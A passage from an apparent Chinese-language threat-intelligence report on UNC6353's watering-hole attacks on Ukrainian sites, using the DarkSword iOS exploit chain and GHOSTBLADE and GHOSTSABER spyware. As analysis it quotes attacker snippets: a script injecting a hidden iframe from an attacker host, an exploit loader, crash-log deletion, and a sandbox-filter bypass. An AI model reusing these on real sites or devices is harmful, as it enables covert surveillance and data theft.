rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendThumbnails</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">在指定时间段内，将 iOS 照片应用中的缩略图上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendApp</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将指定已安装应用程序的所有文件上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">RecordAudio</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">未直接实施</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendFiles</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将任意文件列表上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendRegEx</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将路径与指定正则表达式模式匹配的文件列表上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">SendFileList</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">将指定目录中的文件和元数据递归列表上传到 C2 服务器</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><code style="-webkit-tap-highlight-color: transparent;font-family: Consolas, Monaco, &#34;Bitstream Vera Sans Mono&#34;, &#34;Courier New&#34;, Courier, monospace;font-size: 1em;box-sizing: border-box;background: rgb(241, 243, 244);color: rgba(0, 0, 0, 0.9);font-weight: 300;overflow-x: auto;padding: 3px 6px;white-space: break-spaces;overflow-wrap: normal;vertical-align: baseline;"><span leaf="">EvalJs</span></code></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">执行任意 JavaScript 代码块并将输出上传到 C2 服务器</span></font></font></span></p></td></tr></tbody></table>  
表 1：GHOSTSABER 支持的命令  
# 来自 UNC6353 的新乌克兰水坑活动  
  
GTIG 观察到疑似俄罗斯间谍组织 UNC6353 利用 DarkSword 漏洞发起针对乌克兰用户的新型水坑攻击活动。正如我们最近的所述，我们最早于 2025 年夏季开始追踪 UNC6353，当时该组织是一个威胁集群，通过对乌克兰网站发起水坑攻击来传播 Coruna 恶意软件。此次新活动持续到 2026 年 3 月，但至少可以追溯到 2025 年 12 月，该活动利用 DarkSword 漏洞链部署 GHOSTBLADE 恶意软件。GTIG 已通知 CERT-UA 并与其合作，共同缓解此次攻击活动。  
  
被入侵的乌克兰网站被更新，植入了一个恶意script标签，该标签从 UNC6353 服务器获取第一阶段的交付内容static.cdncounter[.]net（图 14）。该脚本（图 15）动态创建一个新的 IFrame，并将其源设置为index.html同一服务器上的一个文件（图 16）。虽然index.html它与 UNC6748 和 PARS Defense 使用的着陆页逻辑有一些重叠之处，但它在设置uid会话存储密钥时并未检查会话的当前状态，并且包含一条俄语注释，翻译过来是“如果仍然需要 uid，只需安装它”。  
  
值得注意的是，我们观察到的 UNC6353 对 DarkSword 的使用仅支持 iOS 18.4-18.6。虽然早期 UNC6748 和 PARS Defense 对 DarkSword 的使用也支持 iOS 18.7，但我们并未在 UNC6353 中观察到这一点，尽管它们的运行时间较晚。然而，该版本中使用的加载器能够正确加载与运行的 iOS 版本对应的远程代码执行 (RCE) 模块，而我们在 UNC6748 对 DarkSword 的使用中并未观察到这一点，因为 UNC6748 仅支持 iOS 18.4-18.6（图 17）。  
  
图 14：scriptUNC6353 使用的恶意标签（2026 年 3 月）  
  
(function () {  
  
const iframe = document.createElement("iframe");  
  
iframe.src = "https://static.cdncounter.net/assets/index.html";  
  
iframe.style.width = "1px";  
  
iframe.style.height = "1px";  
  
iframe.style.border = "0";  
  
iframe.style.position = "absolute";  
  
iframe.style.left = "-9999px";  
  
iframe.style.opacity = "0.01";  
  
// важно для Safari  
  
iframe.setAttribute(  
  
"sandbox",  
  
"allow-scripts allow-same-origin"  
  
);  
  
document.body.appendChild(iframe);  
  
})();  
  
图 15：widgets.js（UNC6353，2026 年 3 月）  
  
  
Test Page  
  
// если uid всё ещё нужен — просто устанавливаем  
  
sessionStorage.setItem('uid', '1');  
  
const frame = document.createElement('iframe');  
  
frame.src = 'frame.html?' + Math.random();  
  
frame.style.width = '1px';  
  
frame.style.opacity = '0.01'  
  
frame.style.position = 'absolute';  
  
frame.style.left = '-9999px';  
  
frame.style.height = '1px';  
  
frame.style.border = 'none';  
  
document.body.appendChild(frame);  
  
图 16：index.html（UNC6353，2026 年 3 月）  
  
let workerCode = "";  
  
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')  
  
workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version  
  
else  
  
workerCode = getJS(`rce_worker_18.4.js?${Date.now()}`); // local version  
  
let workerBlob = new Blob([workerCode],{type:'text/javascript'});  
  
let workerBlobUrl = URL.createObjectURL(workerBlob);  
  
图 17：rce_loader.js加载 RCE 漏洞利用工作进程的代码片段（UNC6353，2026 年 3 月）  
# 鬼刃  
  
在这些水坑感染设备后，UNC6353 部署了 GTIG 追踪的名为 GHOSTBLADE 的恶意软件家族。GHOSTBLADE 是一款用 JavaScript 编写的数据挖掘程序，能够从受感染的设备中收集并窃取各种数据（表 2）。GHOSTBLADE 收集的数据通过 HTTP(S) 协议被窃取到攻击者控制的服务器。与 GHOSTKNIFE 和 GHOSTSABER 不同，GHOSTBLADE 的功能较弱，不支持任何额外的模块或类似后门的功能；它也不会持续运行。然而，与 GHOSTKNIFE 类似，GHOSTBLADE 也包含用于删除崩溃报告的代码，但其目标目录与 GHOSTKNIFE 不同（图 18）。本次活动中观察到的 GHOSTBLADE 样本包含完整的调试日志以及大量的代码注释。  
  
值得注意的是，GTIG 分析的 GHOSTBLADE 样本包含一条注释和代码块，该注释和代码块会在 iOS 版本大于或等于 18.4 时有条件地执行代码，而 18.4 是 DarkSword 支持的最低版本（图 19；注意，该值ver是从 `` 解析而来uname，而 `` 返回的是 XNU 版本）。这表明该有效载荷也支持在低于 18.4 的版本上运行，而 DarkSword 不支持这些版本。  
<table><thead><tr style="-webkit-tap-highlight-color: transparent;"><th style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);text-align: left;font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">类别</span></font></font></strong></p></th><th style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);text-align: left;font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">收集的数据</span></font></font></strong></p></th></tr></thead><tbody><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">沟通与信息传递</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">iMessage数据库、Telegram数据、WhatsApp数据、邮件索引、通话记录、联系人互动数据、联系人</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">身份和访问</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">设备/帐户标识符、已登录帐户、设备钥匙串、SIM 卡信息、设备配置文件</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">位置和移动性</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">位置历史记录、已保存/已知的 Wi-Fi 网络和密码、“查找我的 iPhone”设置、定位服务设置</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">个人内容和媒体</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">照片元数据、隐藏照片、屏幕截图、iCloud 云盘文件、备忘录数据库、日历数据库</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">财务和交易</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">加密货币钱包数据</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">使用情况和行为数据</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">Safari 浏览历史记录/书签/Cookie、健康数据库、设备个性化数据</span></font></font></span></p></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">系统和连接</span></font></font></span></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><span style="-webkit-tap-highlight-color: transparent;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">已安装应用列表、备份设置/信息、移动数据使用情况/信息、App Store 偏好设置</span></font></font></span></p></td></tr></tbody></table>  
表2：GHOSTBLADE收集的数据  
  
static deleteCrashReports()  
  
{  
  
this.getTokenForPath("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);  
  
libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__["default"].deleteDir("/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.osanalytics/DiagnosticReports/",true);  
  
}  
  
图 18：用于删除崩溃日志的 GHOSTBLADE 代码片段  
  
// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions  
  
if (ver.major == 24 && ver.minor >= 4) {  
  
mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));  
  
libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);  
  
migFilterBypass = new MigFilterBypass(mutexPtr);  
  
}  
  
图 19：在 GHOSTBLADE 中，针对 iOS 18.4+ 有条件执行的代码  
# DarkSword漏洞链  
  
如前所述，DarkSword 利用六个不同的漏洞完全攻陷易受攻击的 iOS 设备，并以完整的内核权限运行最终有效载荷（表 3）。与 Coruna 不同，DarkSword 仅支持有限的 iOS 版本（18.4-18.7），并且虽然各个攻击阶段的技术较为复杂，但其用于加载漏洞利用程序的机制比 Coruna 更基础、更不稳健。  
  
与 Coruna 不同，DarkSword 在漏洞利用链的所有阶段以及最终有效载荷中都使用纯 JavaScript。虽然在 JavaScript 与漏洞利用中使用的原生 API 和进程间通信 (IPC) 通道之间建立桥接需要更复杂的技术，但它的使用避免了识别绕过iOS或漏洞的必要性，这些漏洞原本可以阻止执行未签名的二进制代码。  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">漏洞利用模块</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">CVE</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">描述</span></font></font></strong></p></td><td style="-webkit-tap-highlight-color: transparent;padding: 16px;margin: 0px;vertical-align: middle;border: 1px solid rgb(0, 0, 0);"><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;box-sizing: border-box;font-size: 17px;line-height: 1.8;letter-spacing: inherit;color: rgba(0, 0, 0, 0.9);font-weight: 400;margin-bottom: 24px;"><strong style="-webkit-tap-highlight-color: transparent;font-weight: 700;box-sizing: border-box;vertical-align: baseline;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><font dir="auto" style="-webkit-tap-highlight-color: transparent;vertical-align: inherit;"><span leaf="">被用作零日漏洞</span></font></font></strong></p></td><td 